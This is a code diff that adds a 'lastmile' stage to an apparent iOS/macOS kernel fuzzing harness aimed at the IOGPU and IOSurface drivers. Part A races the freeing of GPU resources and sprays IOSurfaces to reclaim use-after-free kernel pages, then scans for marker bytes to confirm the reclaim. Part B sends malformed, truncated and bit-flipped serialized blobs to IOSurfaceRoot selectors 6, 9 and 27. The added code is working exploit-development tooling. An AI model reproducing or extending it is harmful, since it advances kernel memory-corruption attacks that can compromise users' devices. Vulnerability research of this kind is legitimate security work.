@@ -17411,6 +17411,158 @@ sel7fuzz:
     LOG("[csurf] done (alive), cases %ld", caseidx);
 }
 
+// V110: (A) reclaim UAF pages via IOSurface spray; (B) deep IOSurface fuzz
+// (sel9 manual IOCFSerialize binary blobs, sel27 bulk-attachment frames).
+#include <IOKit/IOCFSerialize.h>
+static void p_lastmile(void) {
+    const char *step = getenv("FUZZ_LASTMILE_STEP") ?: "A";
+    LOG("[lm] v110 part %s", step);
+    if (!strcmp(step, "A")) {
+        io_connect_t ourc = open_service("IOGPU", 1);
+        id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+        id<MTLCommandQueue> mq = [dev newCommandQueue];
+        uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+        uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+        io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+        if (!mconn || !dev) return;
+        // junk for UAT force-flush
+        uint32_t junk[40]; int nj = 0;
+        for (int i = 0; i < 40; i++) {
+            uint64_t g; uint8_t *p;
+            uint32_t r = gpu_resource2(mconn, 0x1000, &g, &p);
+            if (r) junk[nj++] = r;
+        }
+        // spray variants: {w,h,fourcc,label}
+        static const struct { int w, h; uint32_t fmt; int bpe; const char *n; } sprays[] = {
+            { 64, 64, 0x42475241, 4, "BGRA 64x64 (0x4000)" },
+            { 32, 32, 0x42475241, 4, "BGRA 32x32 (0x1000)" },
+            { 128, 128, 0x42475241, 4, "BGRA 128x128 (0x10000)" },
+            { 256, 256, 0x42475241, 4, "BGRA 256x256 (0x40000)" },
+            { 64, 64, 0x34323076, 1, "420v 64x64" },
+        };
+        for (unsigned sv = 0; sv < sizeof(sprays)/sizeof(sprays[0]); sv++) {
+            uint32_t ridV;
+            race_prepare(dev, mq, mconn, 0x10000, &ridV, 8);
+            fsync(fileno(stderr));
+            ioconnect_trap1(mconn, 1, ridV);
+            for (int i = 0; i < nj; i++) ioconnect_trap1(mconn, 1, junk[i]);
+            // IOSurface spray — held alive through the drain
+            IOSurfaceRef sp[96]; int nsp = 0;
+            for (int i = 0; i < 96; i++) {
+                IOSurfaceRef t = make_surface_fmt(sprays[sv].w, sprays[sv].h, sprays[sv].bpe, sprays[sv].fmt);
+                if (t) {
+                    if (IOSurfaceLock(t, 0, NULL) == 0) {
+                        memset(IOSurfaceGetBaseAddress(t), 0x22, IOSurfaceGetAllocSize(t));
+                        IOSurfaceUnlock(t, 0, NULL);
+                    }
+                    sp[nsp++] = t;
+                }
+            }
+            for (int w = 0; w < 40; w++) { if ((long)[g_racecb status] >= 4) break; usleep(50000); }
+            int hits = 0;
+            for (int i = 0; i < nsp; i++) {
+                if (IOSurfaceLock(sp[i], kIOSurfaceLockReadOnly, NULL)) continue;
+                uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sp[i]);
+                size_t total = (size_t)IOSurfaceGetAllocSize(sp[i]);
+                long n41 = 0;
+                for (size_t j = 0; j < total; j += 4) if (*(uint32_t *)(b + j) == 0x41414141) n41++;
+                IOSurfaceUnlock(sp[i], kIOSurfaceLockReadOnly, NULL);
+                if (n41 > 16) { LOG("[lm] A/%s: *** IOSurface #%d has %ld 0x41-qwords — RECLAIMED ***", sprays[sv].n, i, n41); hits++; }
+            }
+            LOG("[lm] A/%s: %d surfaces sprayed, %d hits (cb status %ld)",
+                sprays[sv].n, nsp, hits, (long)[g_racecb status]);
+            for (int i = 0; i < nsp; i++) CFRelease(sp[i]);
+            // recreate junk for next round
+            for (int i = 0; i < 40; i++) {
+                uint64_t g; uint8_t *p;
+                uint32_t r = gpu_resource2(mconn, 0x1000, &g, &p);
+                if (r) junk[i] = r;
+            }
+        }
+        LOG("[lm] A done (alive)");
+        return;
+    }
+    // ---- Part B: sel9 / sel27
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOCoreSurfaceRoot"));
+    if (!s) s = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t c = 0;
+    kern_return_t ko = s ? IOServiceOpen(s, mach_task_self(), 0, &c) : -1;
+    if (s) IOObjectRelease(s);
+    if (ko || !c) { LOG("[lm] B: no conn"); return; }
+    uint8_t *outb = must_map(0x2000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    // need a surface id: create via sel6
+    uint8_t *inb = must_map(0x1000);
+    memset(inb, 0, 0x1000); memset(outb, 0, 0x2000);
+    *(uint32_t *)(inb + 0x08) = 64; *(uint32_t *)(inb + 0x0c) = 64;
+    *(uint32_t *)(inb + 0x10) = 0x42475241;
+    *(uint32_t *)(inb + 0x14) = 4; *(uint32_t *)(inb + 0x18) = 256; *(uint32_t *)(inb + 0x1c) = 0x4000;
+    size_t osz = 3176;
+    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, inb, 32, osc, &nosc, outb, &osz);
+    uint32_t sid = *(uint32_t *)(outb + 0x18);
+    LOG("[lm] B: sel6 sid %u (kr 0x%08x)", sid, kr);
+
+    // sel9: IOCFSerialize binary {id, key, value} — try several key namings
+    static const char *idkeys[] = { "id", "surfaceID", "IOSurfaceID", NULL };
+    for (unsigned kk = 0; idkeys[kk]; kk++) {
+        CFTypeRef dk[] = { CFSTR("id"), CFSTR("key"), CFSTR("value") };
+        CFTypeRef dv[3];
+        dv[0] = CFNumberCreate(NULL, kCFNumberIntType, &sid);
+        dv[1] = CFSTR("lmkey");
+        int one = 1;
+        dv[2] = CFNumberCreate(NULL, kCFNumberIntType, &one);
+        CFStringRef ik = CFStringCreateWithCString(NULL, idkeys[kk], kCFStringEncodingUTF8);
+        dk[0] = ik;
+        CFDictionaryRef dict = CFDictionaryCreate(NULL, dk, dv, 3,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDataRef blob = IOCFSerialize(dict, kIOCFSerializeToBinary);
+        if (blob) {
+            memset(outb, 0, 0x2000);
+            osz = 0x100; nosc = 0;
+            kr = IOConnectCallMethod(c, 9, NULL, 0, CFDataGetBytePtr(blob), CFDataGetLength(blob), osc, &nosc, outb, &osz);
+            LOG("[lm] B sel9 dict{id-key=%s} blob %ld bytes -> kr 0x%08x", idkeys[kk], (long)CFDataGetLength(blob), kr);
+            // mutations: truncated and bit-flipped
+            long bl = CFDataGetLength(blob);
+            uint8_t *mut = malloc(bl);
+            memcpy(mut, CFDataGetBytePtr(blob), bl);
+            for (long cut = 4; cut <= 24 && cut < bl; cut += 4) {
+                memset(outb, 0, 2000);
+                osz = 0x100; nosc = 0;
+                LOG("[lm] B sel9 trunc -%ld ...", cut);
+                fsync(fileno(stderr));
+                kr = IOConnectCallMethod(c, 9, NULL, 0, mut, bl - cut, osc, &nosc, outb, &osz);
+                LOG("[lm] B sel9 trunc -%ld -> kr 0x%08x", cut, kr);
+            }
+            for (int bit = 0; bit < 8; bit++) {
+                mut[4] ^= (1 << bit);   // flip count/type area bytes
+                memset(outb, 0, 0x2000);
+                osz = 0x100; nosc = 0;
+                LOG("[lm] B sel9 flip byte4 bit%d ...", bit);
+                fsync(fileno(stderr));
+                kr = IOConnectCallMethod(c, 9, NULL, 0, mut, bl, osc, &nosc, outb, &osz);
+                LOG("[lm] B sel9 flip bit%d -> kr 0x%08x", bit, kr);
+                mut[4] ^= (1 << bit);
+            }
+            free(mut);
+            CFRelease(blob);
+        }
+        CFRelease(dict); CFRelease(dv[0]); CFRelease(dv[2]); CFRelease(ik);
+    }
+    // sel27 frames: count-prefixed layouts with our sid
+    static const int idoff[] = { 4, 8, 12, 16, 24 };
+    for (unsigned fi = 0; fi < 5; fi++) {
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = 1;                    // count?
+        *(uint32_t *)(inb + idoff[fi]) = sid;
+        memset(outb, 0, 0x2000);
+        osz = 0x100; nosc = 0;
+        kr = IOConnectCallMethod(c, 27, NULL, 0, inb, 160, osc, &nosc, outb, &osz);
+        LOG("[lm] B sel27 frame cnt@0=1 sid@+%d -> kr 0x%08x", idoff[fi], kr);
+    }
+    LOG("[lm] B done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -17541,6 +17693,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_LASTMILE")) { p_lastmile(); LOG("[probe13] lastmile-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CORESURF")) { p_coresurf(); LOG("[probe13] coresurf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
